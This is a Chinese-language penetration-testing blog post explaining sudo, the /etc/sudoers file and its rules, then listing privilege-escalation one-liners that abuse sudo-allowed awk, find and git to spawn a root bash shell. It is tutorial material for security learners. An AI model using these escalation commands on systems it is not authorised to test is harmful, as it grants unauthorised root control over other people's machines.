---
title: Linux渗透 Sudo提权
description: Linux渗透 Sudo提权
pubDate: 11 13 2024
image: https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-9.webp
categories:
  - 网络安全
tags:
  - Linux提权
---

## sudo 命令

sudo 是 Linux 系统管理指令，是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具，如 halt，reboot，su等等。换句话说通过此命令可以让非 root 的用户运行只有 root 才有权限执行的命令。当一般用户执行特殊权限时，在命令前加上 sudo，此时系统会让你输入密码以确认终端机前操作的是你本人，确认后系统会将该命令的进程以超级用户的权限运行。在一定的时间段内，再次执行sudo的命令时不再询问密码，超出此时间段（一般为5分钟）后需要再次输入密码。

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-1.webp)

## sudoers 文件

要想使一个用户具有使用 sudo 的能力，需要让 root 用户将其名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息注册到 `/etc/sudoers` 文件中，即完成对该用户的授权（此时该用户称为“sudoer”）才可以。

在 Linux/Unix 中，`/etc/sudoers` 文件是sudo权限的配置文件，其中储存了一些用户或组可以以 root 权限使用的命令。如下图

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-2.webp)

- 给用户赋予全部root权限：找到 root 权限 `root ALL=(ALL:ALL) ALL`，在下一行输入 `kali ALL(ALL:ALL) ALL`，保存后退出，这样即表示用户 kali 可以使用 sudo 调用 root 权限执行命令。即此时 kali 用户相当于 root 了

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-3.webp)

使用 `sudo -l` 查看权限

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-4.webp)

- 给予用户部分权限：`kali ALL=(root) NOPASSWD: /usr/bin/python`，kali 用户就能使用 sudo 去以 root 权限执行 `/usr/bin/python` 命令了

## sudo 提权

### awk

awk：

```shell
sudo awk 'BEGIN{system("/bin/bash")}'
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-6.webp)

### find

find：这里查找的东西一定是存在的，不然会报错

```shell
sudo find /home -exec /bin/bash \;
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-5.webp)

### git

```shell
sudo git help add
```

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-7.webp)

![](https://img.trtyr.top/images/blog/Linux%E6%B8%97%E9%80%8F%20Sudo%E6%8F%90%E6%9D%83/003%20Linux%20Sudo%E6%8F%90%E6%9D%83-8.webp)
